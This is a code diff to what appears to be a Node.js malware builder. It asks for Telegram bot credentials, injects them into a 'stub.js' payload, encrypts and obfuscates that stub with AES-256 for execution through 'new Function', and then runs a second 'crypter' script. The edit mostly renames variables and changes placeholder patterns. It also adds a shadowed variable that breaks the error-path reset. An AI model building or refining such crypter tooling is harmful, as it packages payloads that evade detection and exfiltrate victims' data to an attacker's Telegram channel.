@@ -81,25 +81,30 @@ function executeSecondCrypterScript() {
   }
 }
 
-function resetPlaceholder(stubPath, originalStubCode) {
-  fs.writeFileSync(stubPath, originalStubCode, 'utf8');
+function resetPlaceholder(stubPath, stubCode) {
+  fs.writeFileSync(stubPath, stubCode, 'utf8');
   console.log('Success reset.');
 }
 
 async function main() {
-  let originalStubCode; // Variable to store the original stub code
+  let stubCode; // Variable to store the original stub code
 
   try {
     const { botToken, chatId } = await promptForTelegramCredentials();
 
     // Update the values in stub.js for Telegram
     const stubPath = path.resolve(__dirname, 'stub.js');
-    originalStubCode = fs.readFileSync(stubPath, 'utf8'); 
-    const updatedStubCode = originalStubCode 
-    .replace(/const telegramBotToken = 'REPLACE_ME';/, `const telegramBotToken = '${botToken}';`)
-    .replace(/const telegramChatId = 'REPLACE_ME';/, `const telegramChatId = '${chatId}';`);
-
-    if (originalStubCode === updatedStubCode) {
+    let stubCode = fs.readFileSync(stubPath, 'utf8');
+ 
+    const updatedStubCode = stubCode.replace(
+      /const botToken = 'YOURBOTTOKEN';/,
+      `const telegramBotToken = '${botToken}';`
+    ).replace(
+      /const chatId = 'YOURCHATID';/,
+      `const telegramChatId = '${chatId}';`
+    );
+    
+    if (stubCode === updatedStubCode) {
       throw new Error('Failed to update placeholder in stub.js. Please make sure the placeholder exists.');
     }
 
@@ -150,7 +155,7 @@ new Function('require', decrypted)(require);
     console.log(`Obfuscated and encrypted with AES-256.`);
 
     setTimeout(() => {
-      resetPlaceholder(stubPath, originalStubCode);
+      resetPlaceholder(stubPath, stubCode);
       executeSecondCrypterScript();
     }, 3000);
 
@@ -158,9 +163,9 @@ new Function('require', decrypted)(require);
     console.error(`Error: ${error.message}`);
 
     // If an error occurs, ensure to reset the modified elements
-    if (originalStubCode) {
+    if (stubCode) {
       const updatedStubPath = path.resolve(__dirname, 'stub.js');
-      resetPlaceholder(updatedStubPath, originalStubCode);
+      resetPlaceholder(updatedStubPath, stubCode);
     }
   } finally {
     // Close the readline interface to avoid resource leaks
